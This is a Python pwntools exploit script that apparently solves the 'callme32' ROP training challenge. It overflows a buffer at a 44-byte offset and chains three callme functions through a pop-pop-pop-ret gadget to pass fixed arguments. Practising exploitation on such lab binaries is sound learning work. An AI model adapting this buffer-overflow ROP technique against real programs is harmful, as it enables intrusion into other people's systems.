#!/bin/python3
from pwn import *
import sys

binary = "./callme32"
elf = context.binary = ELF(binary, False)
context.terminal = ["terminator", "-x", "bash", "-c"]
context.log_level  = 'debug'
libc = elf.libc
rop = ROP(elf)

#### GDB Script
script = '''

'''


def start(*args, **kwargs):
    usage = f"{sys.argv[0]} gdb \nor \n{sys.argv[0]} remote"
    # [ip, port]
    REMOTE = []
    if args:
        arguments = list(args)
        arguments.insert(0, elf.path)
        return process(arguments)

    if not args and not kwargs:
        if len(sys.argv) > 1:
            if sys.argv[1] == 'gdb':
                return gdb.debug(elf.path, gdbscript=script)
            elif sys.argv[1] == 'remote':
                return remote(REMOTE[0], REMOTE[1])
            else:
                print("INVALID ARGUMENT")
                print(usage)
                sys.exit(0)
        else:
            return process(elf.path)

def main():
    ### MAIN CODE HERE
    arg1, arg2, arg3 = 0xdeadbeef, 0xcafebabe, 0xd00df00d
    
    ## rop gadget
    gadget = rop.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]
    offset = 44 # offset to eip
    payload = flat(
        cyclic(offset),
        elf.sym['callme_one'],
        gadget,
        arg1, arg2, arg3,
        elf.sym['callme_two'],
        gadget,
        arg1, arg2, arg3,
        elf.sym['callme_three'],
        gadget,
        arg1, arg2, arg3
    )

    io = start()
    io.recvuntil('> ')
    io.sendline(payload)
    io.interactive()
if __name__ == "__main__":
    main()